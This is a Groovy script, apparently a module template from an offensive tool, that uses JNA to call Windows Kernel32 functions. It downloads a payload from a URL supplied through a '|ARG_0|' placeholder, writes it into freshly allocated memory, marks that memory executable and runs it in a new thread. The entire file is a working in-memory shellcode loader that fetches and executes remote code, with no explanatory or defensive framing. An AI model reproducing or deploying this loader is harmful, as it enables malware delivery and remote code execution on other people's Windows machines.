@Grab(group='net.java.dev.jna', module='jna', version='5.12.1')
import com.sun.jna.Native
import com.sun.jna.Pointer
import com.sun.jna.ptr.IntByReference
import com.sun.jna.Library
import java.io.ByteArrayOutputStream

class Constants {
    static final int PAGE_READWRITE = 0x04
    static final int PAGE_EXECUTE_READ = 0x20
    static final int MEM_COMMIT = 0x1000
    static final int MEM_RESERVE = 0x2000
}

interface Kernel32 extends Library {
    Kernel32 INSTANCE = Native.load("Kernel32", Kernel32.class)
    int GetLastError()
    Pointer CreateThread(
        Pointer lpThreadAttributes,
        int dwStackSize,
        Pointer lpStartAddress,
        Pointer lpParameter,
        int dwCreationFlags,
        IntByReference lpThreadId
    )
    int WaitForSingleObject(
        Pointer hHandle,
        int dwMilliseconds
    )

    Pointer VirtualAlloc(
        Pointer lpAddress,
        int dwSize,
        int flAllocationType,
        int flProtect
    )

    boolean VirtualProtect(
        Pointer lpAddress,
        int dwSize,
        int flNewProtect,
        IntByReference lpflOldProtect
    )
}

byte[] downloadFileAsBytes(String fileUrl) {
    URL url = new URL(fileUrl)
    ByteArrayOutputStream outputStream = new ByteArrayOutputStream()
    url.openStream().withStream { inputStream ->
        byte[] buffer = new byte[1024]
        int bytesRead
        while ((bytesRead = inputStream.read(buffer)) != -1) {
            outputStream.write(buffer, 0, bytesRead)
        }
    }
    return outputStream.toByteArray()
}

void Go() {
  String fileUrl = '|ARG_0|'

  byte[] fileBytes = downloadFileAsBytes(fileUrl)

  println "File downloaded as bytes, size: ${fileBytes.length}"

  Pointer lpAddress = Kernel32.INSTANCE.VirtualAlloc(
      null,
      fileBytes.length,
      Constants.MEM_COMMIT | Constants.MEM_RESERVE,
      Constants.PAGE_READWRITE
  )

  if (lpAddress == null) {
      throw new RuntimeException("Failed to allocate memory. Error: " + Kernel32.INSTANCE.GetLastError())
  }

  lpAddress.write(0, fileBytes, 0, fileBytes.length)

  IntByReference lpflOldProtect = new IntByReference()

  if (!Kernel32.INSTANCE.VirtualProtect(lpAddress, fileBytes.length, Constants.PAGE_EXECUTE_READ, lpflOldProtect)) {
      throw new RuntimeException("Failed to change memory protection. Error: " + Kernel32.INSTANCE.GetLastError())
  }

  IntByReference lpThreadId = new IntByReference()

  Pointer hThread = Kernel32.INSTANCE.CreateThread(
      null,
      0,
      lpAddress,
      null,
      0,
      lpThreadId
  )

  if (hThread == null) {
      throw new RuntimeException("Failed to create thread. Error: " + Kernel32.INSTANCE.GetLastError())
  }

  if (Kernel32.INSTANCE.WaitForSingleObject(hThread, (int)0xFFFFFFFF) == 0xFFFFFFFF) {
      throw new RuntimeException("Failed to wait for thread. Error: " + Kernel32.INSTANCE.GetLastError())
  }
}

Thread thread = new Thread(){
    public void run(){
        Go();
    }
}

thread.start();
